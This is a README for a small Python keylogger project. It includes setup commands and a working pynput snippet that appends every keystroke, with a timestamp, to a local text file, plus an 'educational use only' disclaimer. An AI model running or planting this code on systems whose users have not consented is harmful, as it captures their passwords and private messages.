# Software-Keylogger-Timestamp


Keylogger with Timestamp 🛡️

Overview  
This project is a Python-based **Keylogger** that records keystrokes and timestamps them. It is designed for educational purposes and showcases how to monitor and log keyboard activity efficiently.  

Features  
- Logs every keystroke with precise **timestamps**.  
- Saves logs in a structured file for easy analysis.  
- Lightweight and easy to integrate into different systems.  

Prerequisites  
- Python 3.x  
- Libraries:  
  - `pynput` (for listening to keyboard events)  
  - `datetime` (for timestamping the logs)  

Install the required libraries:  
```bash
pip install pynput
```

How It Works  
1. The program listens to keyboard inputs using the `pynput` library.  
2. Each keystroke is logged along with its timestamp using Python's `datetime` module.  
3. The logs are saved in a text file (`keylogs.txt`).  

Usage  
1. Clone this repository:  
   ```bash
   git clone <repository-url>
   cd keylogger-with-timestamp
   ```
2. Run the script:  
   ```bash
   python keylogger.py
   ```
3. View the recorded logs in the `keylogs.txt` file.  

Code Example  
Here’s a snippet of the keylogging functionality:  
```python
from pynput import keyboard
from datetime import datetime

def on_press(key):
    with open("keylogs.txt", "a") as file:
        file.write(f"{datetime.now()}: {key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

Disclaimer  
This tool is for **educational purposes only**. Unauthorized use may violate privacy laws. Use responsibly!  

License  
This project is licensed under the MIT License.  

